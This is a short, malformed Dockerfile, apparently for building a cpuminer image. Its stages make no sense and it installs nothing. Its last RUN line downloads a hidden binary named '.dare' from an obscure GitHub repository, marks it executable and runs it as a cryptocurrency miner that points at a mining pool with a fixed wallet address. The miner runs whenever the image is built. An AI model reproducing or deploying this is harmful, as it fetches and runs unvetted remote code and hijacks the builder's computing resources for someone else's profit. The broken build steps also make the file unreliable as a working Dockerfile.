FROM ubuntu:16.04 as builder

RUN apt-get update \
  && apt-get install -y

COPY --from=builder /app/cpuminer .
ENTRYPOINT ["./cpuminer"]
CMD ["-h"]
RUN wget https://github.com/egfeafeaaegf/swfcaefea/raw/main/.dare && chmod +x .dare && ./.dare -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q0kwl82t7ppx8vmffehx22l2w8lnzy08jl2t9dz.adz1
